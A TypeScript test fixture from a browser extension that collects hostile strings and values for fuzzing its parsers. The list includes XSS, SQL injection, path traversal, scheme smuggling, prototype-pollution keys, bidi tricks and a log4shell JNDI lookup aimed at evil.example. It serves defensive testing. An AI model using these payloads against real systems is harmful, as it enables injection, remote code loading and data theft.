// SPDX-License-Identifier: GPL-3.0-or-later
//
// One hostile-input corpus for every seam that parses something the extension did not write:
// the runtime message a content script sends, a URL read off a page, a history file the user
// imports. Each seam asserts its OWN contract against it (reject, or accept-and-bound) - the
// shared part is the list, so a vector added here is immediately tried everywhere.
//
// Kept out of any single test file on purpose: these strings are cheap to write once and
// expensive to remember per file, and a seam that only ever saw its author's imagination is
// the one that breaks on the input nobody pictured.

/** Strings that must never be mistaken for a usable value. Scheme smuggling, traversal,
 *  injection payloads, invisible characters, and sizes that break a naive parser. */
export const HOSTILE_STRINGS: readonly string[] = [
  "",
  " ",
  "\t\n\r",
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  // A scheme hidden behind characters a URL parser strips before it decides.
  "java\tscript:alert(1)",
  "\u0000javascript:alert(1)", // spelled as an escape: a raw NUL here is invisible next to the space variant below
  " javascript:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "vbscript:msgbox(1)",
  "blob:https://example.com/00000000-0000-0000-0000-000000000000",
  "file:///etc/passwd",
  "chrome-extension://abcdefghijklmnopabcdefghijklmnop/auth.html",
  "about:blank",
  "//evil.example/path",
  "\\\\evil.example\\share",
  "../../etc/passwd",
  "..%2f..%2fetc%2fpasswd",
  "%00",
  "' OR 1=1--",
  '"; DROP TABLE votes; --',
  "<img src=x onerror=alert(1)>",
  // biome-ignore lint/suspicious/noTemplateCurlyInString: the log4shell payload IS the fixture - interpolating it would test nothing
  "${jndi:ldap://evil.example/a}",
  "{{constructor.constructor('alert(1)')()}}",
  "__proto__",
  "constructor",
  "prototype",
  // Invisible and direction-flipping characters: they survive a trim and change how a
  // human reads whatever renders them.
  "​‌‍﻿",
  "https://ex​ample.com/",
  "‮gnp.exe",
  "⁦⁧⁨⁩",
  // Homograph and punycode authorities.
  "https://exаmple.com/", // Cyrillic а
  "https://xn--e1awd7f.example/",
  // Sizes.
  "x".repeat(10_000),
  `https://www.facebook.com/${"a".repeat(100_000)}`,
  // Numeric-looking strings a loose parser coerces.
  "0",
  "-0",
  "1e999",
  "NaN",
  "Infinity",
];

/** Non-string values a JSON payload can carry where a string was expected. */
export const HOSTILE_VALUES: readonly unknown[] = [null, undefined, 0, -1, Number.NaN, Number.POSITIVE_INFINITY, true, false, [], {}, [["a"]], { toString: () => "https://www.facebook.com/" }, { valueOf: () => 1 }];
